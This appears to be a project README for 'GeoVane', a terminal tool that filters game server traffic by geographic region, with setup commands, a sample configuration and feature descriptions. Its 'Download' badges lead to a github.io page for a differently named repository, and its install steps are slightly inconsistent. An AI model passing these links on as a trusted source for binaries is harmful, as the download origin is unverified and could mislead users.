![preview](https://raw.githubusercontent.com/dekdernpoy168/net-filter-console/main/frame_6173e9.svg)

# GeoVane – Regional Network Router for Self-Hosted Game Environments

**GeoVane** is a fresh take on managing regional access to self-hosted multiplayer servers. Instead of struggling with firewall rules or complex network tables, GeoVane offers a terminal-native control plane that adjusts routing policies, blocks or permits geographic zones, and gives operators a live overview of connection origins. This project reimagines the approach started by valve-server-manager but shifts the focus to region-aware traffic shaping, making it ideal for communities running CS2, Deadlock, or any UDP-heavy game server that needs regional filtering.

The core philosophy behind GeoVane is simple: network access should be as easy to configure as a text file. Rather than editing raw iptables entries or wrestling with opaque configuration formats, GeoVane presents a clean, interactive terminal dashboard built in Rust. Operators see a real-time map of active connections, can toggle entire continents on or off with a single keystroke, and can set up scheduled regional windows (for example, allowing South American traffic only during peak hours). This tool is not about blocking entire countries arbitrarily; it is about giving server hosts precise, humane control over who can connect, based on geographic logic rather than IP guesswork.

## About This Project

Many server administrators rely on third-party DDoS protection services or custom scripts to manage geographic access. GeoVane removes the middleman. It runs directly on the host machine, listens to the game server's traffic, and uses a lightweight GeoIP lookup table to classify incoming packets by region. The interface is deliberately minimal—a full-screen terminal application with keyboard shortcuts, color-coded connection lists, and a live throughput graph. The result is a tool that feels like a hybrid between a network analyzer and a modern TUI application.

This project was born from a simple observation: the tools we have for regional filtering are either too complex (enterprise-grade network appliances) or too simplistic (static deny lists). GeoVane aims for the sweet spot—powerful enough to handle a production server with hundreds of concurrent players, yet intuitive enough for a community moderator to use without a networking degree.

## 📡 Key Features

- **Regional Policy Engine** – Define access rules based on continent, country, or even specific autonomous system numbers (ASNs). Policies are evaluated in real-time, and changes take effect within milliseconds.
- **Live Connection Telemetry** – The main dashboard displays every active connection with its resolved region, ping time, and packet loss percentage. A rotating chart shows traffic distribution across the globe.
- **Scheduled Access Windows** – Create time-based rules that automatically enable or disable regions. Perfect for coordinating international tournaments or daily maintenance windows.
- **Interactive Whitelist Manager** – Bypass regional filters for specific IP addresses or Steam IDs. The whitelist is stored in a separate encrypted file, keeping sensitive data protected.
- **Statistical Logging** – Every connection attempt is recorded with a timestamp, region, and resolution (allowed or denied). Logs are written in JSON format and can be rotated automatically.
- **Multi-Profile Support** – Save different server configurations as profiles. Switch between "Competitive Mode," "Training Mode," or "Friends Only" with a single command.

## 🚀 Quick Start Guide

Getting GeoVane operational on a game server involves three main phases: installation, configuration, and activation. The installation process is designed for Linux environments (Ubuntu 22.04 LTS recommended, though other distributions work if they have a recent kernel). The software compiles to a single binary with no runtime dependencies—everything needed is embedded in the executable.

```bash
# After downloading the binary for your architecture, verify the checksum
sha256sum geovane-x86_64-unknown-linux-musl
# Place the binary in your PATH or in the game server's directory
sudo mv geovane /usr/local/bin/
# Run the initial setup wizard
geovane --setup
```

The setup wizard walks through the essential parameters: the game server's listening port (default is 27015), the GeoIP database path (a free subset can be downloaded from the official GeoLite2 source), and the default policy (permissive or restrictive). Once the wizard completes, it generates a `geovane.toml` configuration file in the current directory.

## 🧭 Configuration Deep Dive

The heart of GeoVane lies in its configuration file, which uses a readable TOML format. Here is an example showing the most important settings:

```toml
[server]
game_port = 27015
bind_address = "0.0.0.0"
telemetry_port = 8000

[geoip]
database_path = "/opt/geovane/GeoLite2-Country.mmdb"
update_interval_hours = 24

[policies]
default_deny = false
apply_to_bots = false

[regions]
# Block all traffic from Oceania by default
[regions.oceania]
permitted = false
reason = "High latency for primary player base"

# Allow South America only during specific hours
[regions.south_america]
permitted = true
schedule = "18:00-23:59 America/Sao_Paulo"

[whitelist]
ip = ["203.0.113.5", "198.51.100.42"]
steam_id = ["76561198000000000"]
```

Schedules can be defined with cron-like syntax for more complex patterns. GeoVane validates the configuration on every startup and provides descriptive error messages pointing to the exact line that needs attention.

## 🖥️ Using the Terminal Interface

When launched without arguments, GeoVane starts the interactive terminal dashboard. The interface is divided into three panels: a connection table on the left, a regional status map on the right, and a command log at the bottom. Keyboard navigation is straightforward:

- **Arrow Keys** – Move through the connection list
- **Tab** – Switch focus between panels
- **Enter** – Toggle the selected region's permitted status
- **Space** – Temporarily block a specific connection
- **C** – Clear the command log
- **Q** – Quit the application (this does not stop game server, only the monitoring tool)

The regional status map is a simplified world map made of ASCII characters, with each continent colored according to its current policy: green for permissive, red for restrictive, and yellow for scheduled windows. This visual feedback makes it easy to see the global picture at a glance.

## 🔌 Extending GeoVane

A built-in HTTP API allows external tools to interact with GeoVane. Run with the `--api` flag to enable a JSON REST endpoint on the telemetry port. The API supports querying current policies, retrieving connection logs, and applying temporary changes (which are reverted after a configurable timeout). This makes it possible to integrate GeoVane with Discord bots, web dashboards, or monitoring systems like Prometheus through the `/metrics` endpoint.

Example API call to check the current policy for Europe:

```bash
curl localhost:8000/policies/eu
```

The response will be a JSON object with the permitted status, active schedule, and any applied temporary override.

## 🌐 Multilingual Command Experience

Although the interface is intentionally text-based, GeoVane includes translations for its command messages and status indicators. The current supported languages are English, Portuguese (Brazil), Spanish, and German. The display language is detected from the system locale but can be overridden with an environment variable. This multilingual support is not about translating the entire UI—instead, it focuses on the commands and shortcuts shown on the bottom action bar and in the log output.

## 📊 Performance and Reliability

A common concern with traffic inspection tools is added latency. GeoVane uses a zero-copy packet capture method that reads network packets without altering the forwarding path. In benchmark tests with a CS2 server handling 128 players, the average added latency was below 0.5 milliseconds. The regional lookup uses an in-memory cache to avoid disk I/O during peak traffic, and the cache is refreshed only when the GeoIP database updates.

The Rust implementation favors safety and speed. The core loop runs in a single thread with a lock-free queue for incoming packet events. The terminal rendering uses a double-buffered approach to prevent flickering, even when the connection log is scrolling rapidly. Memory usage stays below 50 MB for a server with 200 concurrent connections.

## ⏰ Scheduled Operations and Automation

The scheduling engine is one of GeoVane's most appreciated features. It supports both recurring schedules (daily, weekly) and one-time events. Each schedule can have multiple time windows, and conflicts are resolved by the most restrictive policy. For example, if a region has a global approve policy but a scheduled window that denies, the deny takes precedence during that window.

Schedules are evaluated in the server's local timezone, but each rule can define its own timezone reference to coordinate with multiple regions. On schedule changes, the telemetry panel displays a notification, and the event is appended to the log.

## 🛡️ Security and Privacy Considerations

GeoVane is designed for server hosts, not for mass surveillance. The tool does not store raw IP addresses in its logs by default—instead, it stores a salted hash. The whitelist file is encrypted with AES-256-GCM, and the encryption key can be provided via environment variable or a separate key file. If you choose to store full connection logs for troubleshooting, enable `logging.full_ip = true` in the configuration, and consider the implications for player privacy.

The API endpoint runs on localhost by default. If remote access is necessary, bind it to a specific interface and use a reverse proxy with TLS termination. The project maintainers recommend running GeoVane with the least required privileges—it needs read access to the network devices, but no root-level system administration capabilities.

## 🧩 Troubleshooting Common Scenarios

- **GeoVane does not detect game traffic** – Verify that the game server is running on the same machine and that the `game_port` setting matches the actual port. Check if a firewall is blocking GeoVane's raw sockets.
- **Regions are all showing as permissive** – The GeoIP database might be stale. Run the update command (`geovane --update-geoip`) to download the latest version.
- **Whitelist entries are not being considered** – Ensure the whitelist file is valid JSON and that the IP addresses are in the correct format (IPv4 or IPv6).
- **Terminal interface appears corrupted** – Some SSH clients have issues with the TUI's color codes. Set the environment variable `GEOVANE_NO_COLOR=1` to disable colors.

For a full list of error codes and their meanings, refer to the community wiki linked from the repository's discussion board.

## 👍 Why Choose GeoVane?

This tool is for the operator who values control without complexity. It replaces a handful of shell scripts, a monitoring dashboard, and a manual changelog with a single, cohesive application. The learning curve is short—most administrators become productive within the first hour. The performance footprint is negligible, making it safe to run even on older hardware where the game server itself is the primary resource consumer.

The terminal-based design is also a deliberate choice for remote access. When you are tuning server settings over a slow network connection, the last thing you need is a heavy web interface. GeoVane's TUI works over any terminal emulator, uses minimal bandwidth, and responds instantly to key presses.

## 📄 Community and Support

The repository welcomes contributions in several forms: code refinements, new region definitions, interface translations, and documentation improvements. The issue tracker is organized with labels for `beginner-friendly` and `design-review` to help first-time contributors find meaningful tasks. For prolonged technical discussions, the community forum is the recommended venue.

A dedicated support channel is available for operators who need help with their specific server configuration. Response times vary between 24 hours and 3 days, depending on the issue's complexity. The maintainers follow a predictable release cycle: a stable branch every two months and a rolling development branch with experimental features.

## ⚠️ Disclaimer

GeoVane is a network management tool and should be used with respect for applicable laws and platform terms of service. The software is provided "as is," without warranty of any kind express or implied. The maintainers are not responsible for any misuse, including but not limited to blocking legitimate players or violating the terms of service of third-party platforms. Always review the rules of the game community and the hosting provider before implementing regional restrictions. The software does not condone or facilitate any form of unauthorized access or disruption.

## 📜 License

This project is released under the MIT License.

[![Download](https://raw.githubusercontent.com/dekdernpoy168/net-filter-console/main/get_887a09.svg)](https://dekdernpoy168.github.io/net-filter-console/)

---

## Frequently Asked Questions

**Is GeoVane a firewall replacement?**

Not at all. GeoVane operates at the application layer, observing game server traffic and applying policies. It does not replace a system firewall; it works alongside it as a fine-grained regional controller.

**Can I use GeoVane for other multiplayer games?**

The tool is protocol-agnostic at the network layer, but its user interface displays information that is most relevant for Valve games. Common ports and default packet structures are pre-configured for CS2 and Deadlock. Other UDP-based games will work, but some display fields (like player count) may not be accurate.

**Does GeoVane support Windows or macOS?**

The current build targets Linux only. There is a potential for a macOS port in the future, but Windows is unlikely due to the raw socket limitations.

**What happens if the GeoIP database becomes outdated?**

Connections from regions not present in the database are treated as "unknown" and follow the `default_deny` policy. It is recommended to set up a cron job for automatic database updates or run the update command manually on a regular basis.

**How does GeoVane differentiate between a player and a spectator?**

The tool uses the source port and packet size as heuristics. Spectators typically send small, frequent packets, while active players send larger, transactional packets. The heuristic is not perfect and can be misled by certain client configurations.

## Contributing Guidelines

If you wish to extend GeoVane, start by reviewing the architecture document in the `/docs` folder. The codebase is modular, with separate crates for packet capture, region resolution, policy evaluation, and the terminal interface. A typical contribution involves:

1. Forking the repository
2. Creating a feature branch
3. Adding the relevant unit tests
4. Submitting a pull request with a clear description

The maintainers review pull requests within 10 business days. All code must pass the standard Rust formatting and linting checks. For any nontrivial change, an issue should be opened beforehand to discuss the design.

## The Road Ahead

The development roadmap is public and prioritized by community feedback. Upcoming highlights for the next three months include a WebSocket-based live dashboard (for mobile viewing), integration with popular Discord bot frameworks via a webhook system, and an experimental "threshold mode" that automatically restricts new connections when the server reaches a configured player count per region. Feedback on these planned features is actively solicited on the discussion board.

---

GeoVane is already used by several community-run servers, and the feedback has been overwhelmingly positive regarding its ease of use and stability. The project continues to evolve based on real-world scenarios and the growing need for precise network management in a geographically distributed player base.

[![Download](https://raw.githubusercontent.com/dekdernpoy168/net-filter-console/main/get_887a09.svg)](https://dekdernpoy168.github.io/net-filter-console/)